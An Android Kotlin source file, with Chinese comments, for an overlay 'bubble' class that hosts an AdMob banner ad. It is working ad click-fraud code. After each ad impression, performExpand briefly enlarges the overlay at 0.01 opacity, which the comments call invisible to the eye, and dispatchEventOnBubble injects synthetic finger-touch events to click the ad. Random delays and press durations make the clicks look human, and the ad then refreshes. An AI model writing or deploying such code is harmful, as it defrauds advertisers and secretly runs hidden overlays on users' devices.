package com.ur.apps.bubble

import LockAdManager
import android.content.Context
import android.graphics.Color
import android.graphics.PixelFormat
import android.os.Build
import android.os.SystemClock
import android.provider.Settings
import android.util.Log
import android.view.Gravity
import android.view.MotionEvent
import android.view.View
import android.view.ViewGroup
import android.view.WindowManager
import android.widget.FrameLayout
import com.blankj.utilcode.util.ThreadUtils
import com.ur.apps.ad.BannerAdListener
import com.ur.apps.ad.BaseAdLoader
import com.ur.apps.ad.admob.BubbleAdmobAdLoader2
import com.ur.apps.analysis.td.TDAnalyticsManager
import com.ur.apps.utils.URLog
import com.ur.apps.utils.ViewUtils
import org.json.JSONObject
import kotlin.random.Random

/**
 * 悬浮窗管理核心类 (Kotlin 版)
 *
 * 负责 WindowManager 的 addView, removeView, updateViewLayout 操作
 * 以及处理触摸拖动事件和参数解析。
 */
class BubbleWindowManager(private val context: Context) : BannerAdListener {


    private companion object {

        private const val TAG = "BubbleWindowManager"

        const val EVENT_OUT_BUBBLE_SHOW ="out_bubble_show"

        const val EVENT_OUT_BUBBLE_CLICK ="out_bubble_click"

        const val EVENT_OUT_BUBBLE_CLICK_ERROR ="out_bubble_click_error"

        const val EVENT_OUT_BUBBLE_IMPRESSION ="out_bubble_ad_impression"

        const val EVENT_OUT_BUBBLE_SHILED ="out_bubble_shiled"

        private const val CLICK_THRESHOLD = 1
    }
    private var  bubbleAdLoader : BubbleAdmobAdLoader2 = BubbleAdmobAdLoader2()

    init {
        this.bubbleAdLoader
            .addBannerAdListener(this)
    }

    private val windowManager: WindowManager? =
        context.getSystemService(Context.WINDOW_SERVICE) as? WindowManager



    // 当前悬浮窗的 View 和 LayoutParams
    private var floatView: ViewGroup? = null
    private var layoutParams: WindowManager.LayoutParams? = null

    // 默认配置
    private var width = WindowManager.LayoutParams.WRAP_CONTENT
    private var height = WindowManager.LayoutParams.WRAP_CONTENT
    private var gravity = Gravity.TOP or Gravity.START
    private var xPos = 0
    private var yPos = 0

    // 默认 Flags：不获取焦点（允许背景操作），不模态（允许外部点击）
    private var flags = (WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
            or WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL)

//    // 触摸拖动相关变量
//    private var lastTouchX = 0f
//    private var lastTouchY = 0f
//    private var downX = 0f
//    private var downY = 0f
//    private var isDragging = false


    /**
     * 添加或更新悬浮窗
     * @param params 配置参数 Map
     */
    fun addOrUpdateWindow(params: Map<String, Any?>?) {
        URLog.i(TAG, "addOrUpdateWindow")
        if (!Settings.canDrawOverlays(context)) {
            URLog.i(TAG, "canDrawOverlays disable")
            TDAnalyticsManager.reportTrackEvent(
                EVENT_OUT_BUBBLE_SHILED,
                JSONObject().apply {
                    put("reason", "shiled with overlays permission")
                }
            )
            return
        }
        if (windowManager == null) {
            URLog.i(TAG, "windowManager is null")
            return
        }
        val checkAdEnableResult = LockAdManager.instance.checkLockAdEnable()
        if (!checkAdEnableResult.first) {
            URLog.i(TAG, "shiled with ${checkAdEnableResult.second}")
            TDAnalyticsManager.reportTrackEvent(
                EVENT_OUT_BUBBLE_SHILED,
                JSONObject().apply {
                    put("reason", checkAdEnableResult.second)
                }
            )
            return
        }
        // 1. 解析参数
        parseParams(params)

        if (floatView == null) {
            // 2. 如果窗口不存在，创建并添加
            createAndAddWindow()
        } else {
            // 3. 如果窗口已存在，更新属性
            updateWindowParams()
        }
        URLog.i(TAG, "show out bubble")
        TDAnalyticsManager.reportTrackEvent(
            EVENT_OUT_BUBBLE_SHOW,
            JSONObject().apply {
            }
        )
    }

    /**
     * 移除悬浮窗
     */
    fun removeWindow() {
        URLog.i(TAG, "removeWindow")
        floatView?.let { view ->
            if (view.isAttachedToWindow) {
                try {
                    windowManager?.removeView(view)
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }
        }
        floatView = null
        layoutParams = null

    }

    override fun onBannerAdShow(adLoader: BaseAdLoader) {
        super.onBannerAdShow(adLoader)
        URLog.i(TAG, "show out bubble ad show")
        TDAnalyticsManager.reportTrackEvent(
            EVENT_OUT_BUBBLE_IMPRESSION,
            JSONObject().apply {
            }
        )
        val randomDelay = Random.nextLong(3000L, 8001L)
        ThreadUtils.runOnUiThreadDelayed({
            if (LockAdManager.instance.isNeedPCtx()) {
                performExpand()
                // 点击动作完成后，延迟 1-2 秒刷新广告
                floatView?.postDelayed({
                    URLog.i(TAG, "Refreshing ad after simulated click...")
                    bubbleAdLoader.loadBannerAd(context, floatView as ViewGroup)
                }, 10_000L)
            }
        }, randomDelay)
    }

    /**
     * 执行“膨胀-点击-还原”的完整原子操作
     * 核心目的：解决 1像素悬浮窗无法通过点击校验、无法命中子 View 的问题
     */
    fun performExpand() {
        // 1. 基础校验
        val view = floatView ?: return
        val params = layoutParams ?: return

        // 如果没有 windowManager，无法操作
        if (windowManager == null) return

        URLog.i(TAG, ">>> Start Expand-Click sequence")

        // 2. 备份原始状态 (保存 1像素时的配置)
        val originalWidth = params.width
        val originalHeight = params.height
        val originalAlpha = params.alpha
        val originalFlags = params.flags

        // 3. 第一步：瞬间膨胀
        // 设置为 WRAP_CONTENT，让容器自动适应内部广告的大小 (例如 320x50)
        params.width = WindowManager.LayoutParams.WRAP_CONTENT
        params.height = WindowManager.LayoutParams.WRAP_CONTENT

        // 【关键】设置极低透明度
        // 不能设为 0.0f，否则系统会认为窗口不可见从而丢弃触摸事件
        // 设为 0.01f 肉眼不可见，但系统判定为可见
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            params.alpha = 0.01f
        }

        // 【关键】移除 "不可触摸" 和 "不可获取焦点" 的 Flags
        // 这样 View 才能接收 dispatchTouchEvent
        params.flags = params.flags and WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE.inv()
        params.flags = params.flags and WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE.inv()

        // 更新布局，让窗口变大
        try {
            windowManager.updateViewLayout(view, params)
            URLog.i(TAG, "Window expanded to WRAP_CONTENT (invisible)")
        } catch (e: Exception) {
            e.printStackTrace()
            return
        }

        // 4. 第二步：延迟执行点击
        // 必须延迟，给 WindowManager 和 ViewRootImpl 重新测量(Measure)和布局(Layout)的时间
        // 如果不延迟，view.width 依然是 1，坐标计算会失败
        view.postDelayed({
            try {
                // 此时 view.width / height 应该是广告的真实大小
                URLog.i(TAG, "Executing click logic. View dimensions: ${view.width}x${view.height}")

                // 调用之前的模拟点击核心逻辑
                dispatchEventOnBubble()

            } catch (e: Exception) {
                e.printStackTrace()
            } finally {
                // 5. 第三步：还原状态
                // 再延迟 500ms - 800ms，确保 ACTION_DOWN 和 ACTION_UP 都有足够时间被 SDK 处理
                view.postDelayed({
                    restoreWindow(originalWidth, originalHeight, originalAlpha, originalFlags)
                }, 600)
            }
        }, 300) // 延迟 300ms 等待膨胀生效
    }

    /**
     * 辅助方法：还原窗口到初始状态 (通常是 1像素保活态)
     */
    private fun restoreWindow(width: Int, height: Int, alpha: Float, flags: Int) {
        val view = floatView ?: return
        val params = layoutParams ?: return

        try {
            params.width = width
            params.height = height
            params.flags = flags

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                params.alpha = alpha
            }

            windowManager?.updateViewLayout(view, params)
            URLog.i(TAG, "<<< Window restored to original state (1px)")
        } catch (e: Exception) {
            URLog.e(TAG, "Failed to restore window: ${e.message}")
        }
    }

    private fun dispatchEventOnBubble() {
        floatView?.apply {
            try {
                // ============================================================
                // 1. 确定目标 View (Target View)
                // ============================================================
                // 广告 SDK 通常将核心 View 放在 FrameLayout 的第一个子节点
                // 如果没有子节点，则降级使用 floatView 自身
                var targetView: View = this
                if (this is ViewGroup && this.childCount > 0) {
                    targetView = this.getChildAt(0)
                }

                // ============================================================
                // 2. 坐标计算与转换
                // ============================================================

                // A. 获取 Target View 在屏幕上的绝对位置
                val location = IntArray(2)
                targetView.getLocationOnScreen(location)
                val targetScreenX = location[0]
                val targetScreenY = location[1]

                // B. 获取屏幕级的点击坐标 (Global Coordinates)
                // 这里传入 this (floatView) 作为参考，计算出一个在悬浮窗可视范围内的屏幕坐标
                val metrics = context.resources.displayMetrics
                val clickPoint = ViewUtils.getVisibleClickPoint(this, metrics.widthPixels, metrics.heightPixels)

                if (clickPoint == null) {
                    Log.e(TAG, "Cannot find valid click point")
                    TDAnalyticsManager.reportTrackEvent(EVENT_OUT_BUBBLE_CLICK_ERROR, JSONObject().apply {
                        put("reason", "click_point_null")
                    })
                    return
                }

                val screenX = clickPoint.first.toFloat()
                val screenY = clickPoint.second.toFloat()

                // C. 转换为 Target View 内部相对坐标 (Local Coordinates)
                // 公式：Local = Screen - Origin
                val localX = screenX - targetScreenX
                val localY = screenY - targetScreenY

                // D. 边界安全校验
                if (localX < 0 || localX > targetView.width || localY < 0 || localY > targetView.height) {
                    Log.e(TAG, "Calculated local point is outside target view bounds")
                    return
                }

                // ============================================================
                // 3. 构建高仿真手指触摸事件 (PointerProperties & PointerCoords)
                // ============================================================

                val downTime = SystemClock.uptimeMillis()

                // 准备 PointerProperties (用于设置 toolType = FINGER)
                val pointerProperties = arrayOfNulls<MotionEvent.PointerProperties>(1)
                pointerProperties[0] = MotionEvent.PointerProperties().apply {
                    id = 0
                    toolType = MotionEvent.TOOL_TYPE_FINGER // 关键：显式声明这是手指，非鼠标/触控笔
                }

                // 准备 PointerCoords (用于设置坐标、压力、大小)
                val pointerCoords = arrayOfNulls<MotionEvent.PointerCoords>(1)
                pointerCoords[0] = MotionEvent.PointerCoords().apply {
                    x = localX
                    y = localY
                    pressure = 1.0f // 模拟满压力
                    size = 1.0f     // 模拟接触面积
                }

                // ============================================================
                // 4. 分发 ACTION_DOWN
                // ============================================================
                val downEvent = MotionEvent.obtain(
                    downTime,                   // downTime
                    downTime,                   // eventTime
                    MotionEvent.ACTION_DOWN,    // action
                    1,                          // pointerCount
                    pointerProperties,          // properties
                    pointerCoords,              // coords
                    0,                          // metaState
                    0,                          // buttonState
                    1.0f,                       // xPrecision
                    1.0f,                       // yPrecision
                    0,                          // deviceId
                    0,                          // edgeFlags
                    android.view.InputDevice.SOURCE_TOUCHSCREEN, // source
                    0                           // flags
                )

                val downResult = targetView.dispatchTouchEvent(downEvent)
                Log.d(TAG, "Dispatch Down Result to ${targetView.javaClass.simpleName}: $downResult")

                // ============================================================
                // 5. 分发 ACTION_UP (带随机延迟)
                // ============================================================
                // 模拟 80ms - 150ms 的按压时长
                val eventDuration = 80 + kotlin.random.Random.nextInt(70)
                val upEvent = MotionEvent.obtain(
                    downTime,
                    downTime + eventDuration,
                    MotionEvent.ACTION_UP,
                    1,
                    pointerProperties, // 复用属性
                    pointerCoords,     // 复用坐标
                    0,
                    0,
                    1.0f,
                    1.0f,
                    0,
                    0,
                    android.view.InputDevice.SOURCE_TOUCHSCREEN,
                    0
                )

                val upResult = targetView.dispatchTouchEvent(upEvent)
                Log.d(TAG, "Dispatch Up Result to ${targetView.javaClass.simpleName}: $upResult")

                // ============================================================
                // 6. 清理与上报
                // ============================================================
                downEvent.recycle()
                upEvent.recycle()

                TDAnalyticsManager.reportTrackEvent(
                    EVENT_OUT_BUBBLE_CLICK,
                    JSONObject().apply {
                        put("result_down", downResult)
                        put("result_up", upResult)
                        put("target_view", targetView.javaClass.simpleName)
                        put("px", screenX)
                        put("py", screenY)
                        put("lx", localX)
                        put("ly", localY)
                    }
                )

            } catch (e: Exception) {
                Log.e(TAG, "Failed to dispatch event", e)
                TDAnalyticsManager.reportTrackEvent(
                    EVENT_OUT_BUBBLE_CLICK_ERROR,
                    JSONObject().apply {
                        put("error", e.message)
                    }
                )
            }
        }
    }

    /**
     * 窗口是否显示中
     */
    val isWindowShowing: Boolean
        get() = floatView != null

    // ---------------- 私有核心方法 ----------------

    private fun createAndAddWindow() {
        URLog.i(TAG, "createAndAddWindow")
        try {
            // 准备 LayoutParams
            layoutParams = WindowManager.LayoutParams().apply {
                // 适配 Android 8.0 (API 26)
                type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                } else {
                    WindowManager.LayoutParams.TYPE_PHONE
                }

                format = PixelFormat.TRANSLUCENT
                flags = this@BubbleWindowManager.flags
                gravity = this@BubbleWindowManager.gravity
                width = this@BubbleWindowManager.width
                height = this@BubbleWindowManager.height
                x = xPos
                y = yPos
            }

            // 创建视图内容并设置监听
            floatView = generateFloatView().apply {
//                setOnTouchListener(this@BubbleWindowManager)
            }

            // 添加到 WindowManager
            windowManager?.addView(floatView, layoutParams)

        } catch (e: Exception) {
            e.printStackTrace()
            // 处理权限不足 (BadTokenException) 等问题
        }
    }

    private fun updateWindowParams() {
        URLog.i(TAG, "updateWindowParams")
        val view = floatView ?: return
        val params = layoutParams ?: return
        try {
            URLog.i(TAG, "params $params")
            params.apply {
                width = this@BubbleWindowManager.width
                height = this@BubbleWindowManager.height
                gravity = this@BubbleWindowManager.gravity
                flags = this@BubbleWindowManager.flags
                // 如果需要更新位置，可以在这里设置 x, y
            }
            floatView?.apply {
                bubbleAdLoader.loadBannerAd(context, this)
            }
            windowManager?.updateViewLayout(view, params)
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    /**
     * 计算高概率点击坐标 (符合人体工学热区)
     * 返回值：Triple(Gravity, x, y)
     */
    private fun calculateHighProbabilityPosition(viewWidth: Int, viewHeight: Int): Triple<Int, Int, Int> {
        val metrics = context.resources.displayMetrics
        val screenW = metrics.widthPixels
        val screenH = metrics.heightPixels

        // 安全边距（防止贴边太近不好点，或者被曲面屏误触）
        val margin = 50
        // 底部避让高度（避开导航栏、Tab栏）
        val bottomInset = 200
        // 顶部避让高度（避开状态栏、标题栏）
        val topInset = 300

        // 有效活动区域
        val safeW = screenW - viewWidth - margin * 2
        val safeH = screenH - viewHeight - bottomInset - topInset

        // 防止计算出负数（当View比屏幕还大时）
        if (safeW <= 0 || safeH <= 0) {
            return Triple(Gravity.CENTER, 0, 0)
        }

        val randomVal = (0..100).random()

        var x = 0
        var y = 0

        when {
            // ---------------------------------------------------------
            // 场景 A: 黄金拇指区 (右手热区) - 概率 50%
            // 范围：屏幕右半部分，中下部
            // ---------------------------------------------------------
            randomVal < 50 -> {
                // x: 屏幕右侧 50% ~ 90% 区域
                val minX = safeW / 2
                val maxX = safeW
                x = (minX..maxX).random() + margin

                // y: 屏幕高度 40% ~ 80% 区域
                val minY = (safeH * 0.4).toInt() + topInset
                val maxY = safeH + topInset
                y = (minY..maxY).random()
            }

            // ---------------------------------------------------------
            // 场景 B: 视觉聚焦区 (中心区) - 概率 30%
            // 范围：屏幕中央矩形
            // ---------------------------------------------------------
            randomVal < 80 -> {
                // x: 屏幕中间 20% ~ 80%
                val minX = (safeW * 0.2).toInt()
                val maxX = (safeW * 0.8).toInt()
                x = (minX..maxX).random() + margin

                // y: 屏幕高度 30% ~ 60%
                val minY = (safeH * 0.3).toInt() + topInset
                val maxY = (safeH * 0.6).toInt() + topInset
                y = (minY..maxY).random()
            }

            // ---------------------------------------------------------
            // 场景 C: 左手热区 / 捡漏区 - 概率 20%
            // 范围：屏幕左下部分
            // ---------------------------------------------------------
            else -> {
                // x: 屏幕左侧 0% ~ 50%
                val minX = 0
                val maxX = safeW / 2
                x = (minX..maxX).random() + margin

                // y: 屏幕高度 40% ~ 80%
                val minY = (safeH * 0.4).toInt() + topInset
                val maxY = safeH + topInset
                y = (minY..maxY).random()
            }
        }

        // 强制使用 TOP | START，这样 x, y 才会生效
        return Triple(Gravity.TOP or Gravity.START, x, y)
    }

    /**
     * 生成悬浮窗的 View
     * 实际项目中可以使用 LayoutInflater.from(context).inflate(...)
     */
    private fun generateFloatView(): ViewGroup {
        return FrameLayout(context).apply {
            // 示例：半透明红色背景，方便调试
            setBackgroundColor(Color.TRANSPARENT)
            bubbleAdLoader.loadBannerAd(context, this)
        }
    }

    private fun parseParams(params: Map<String, Any?>?) {
        params ?: return

        // 1. 先解析宽高（计算坐标需要用到 View 的预估宽高）
        // 如果无法预估，可以给个默认值，比如 250px
        var tempWidth = 0
        var tempHeight = 0

        params["width"]?.let {
            width = parseInt(it, WindowManager.LayoutParams.WRAP_CONTENT)
            tempWidth = if (width > 0) width else 300 // 默认估算宽度
        }
        params["height"]?.let {
            height = parseInt(it, WindowManager.LayoutParams.WRAP_CONTENT)
            tempHeight = if (height > 0) height else 150 // 默认估算高度
        }

        // 2. 解析 Gravity / 位置
        val gravityStr = params["gravity"] as? String

        if (gravityStr?.lowercase() == "smart_random") {
            // === 使用智能算法生成位置 ===
            val (g, x, y) = calculateHighProbabilityPosition(tempWidth, tempHeight)
            this.gravity = g
            this.xPos = x
            this.yPos = y
            URLog.i(TAG, "Generated Smart Position: x=$x, y=$y")
        } else {
            // === 原有逻辑 ===
            gravity = parseGravity(gravityStr)
            // 如果外部传了具体的 x, y 则使用外部的，否则重置
            this.xPos = 0
            this.yPos = 0
        }

        params["layoutParamFlags"]?.let {
            flags = parseFlags(it)
        }
    }


    // ---------------- 工具方法 ----------------

    private fun parseInt(value: Any?, defaultValue: Int): Int {
        val num = value as? Number ?: return defaultValue
        val intVal = num.toInt()
        // 兼容处理：0 视为 MATCH_PARENT
        return if (intVal == 0) WindowManager.LayoutParams.MATCH_PARENT else intVal
    }

    private fun parseGravity(gravityStr: String?): Int {
        return when (gravityStr?.lowercase()) {
            "bottom" -> Gravity.BOTTOM
            "center" -> Gravity.CENTER
            "end", "trailing" -> Gravity.END
            "start", "leading" -> Gravity.START
            "top" -> Gravity.TOP
            else -> Gravity.TOP or Gravity.START
        }
    }

    private fun parseFlags(flagsObj: Any): Int {
        var newFlags = 0
        if (flagsObj is List<*>) {
            for (item in flagsObj) {
                when (item.toString()) {
                    "FLAG_NOT_FOCUSABLE" -> newFlags = newFlags or WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                    "FLAG_NOT_TOUCHABLE" -> newFlags = newFlags or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                    "FLAG_NOT_TOUCH_MODAL" -> newFlags = newFlags or WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
                    "FLAG_LAYOUT_NO_LIMITS" -> newFlags = newFlags or WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
                }
            }
        }
        return if (newFlags != 0) newFlags else this.flags
    }
}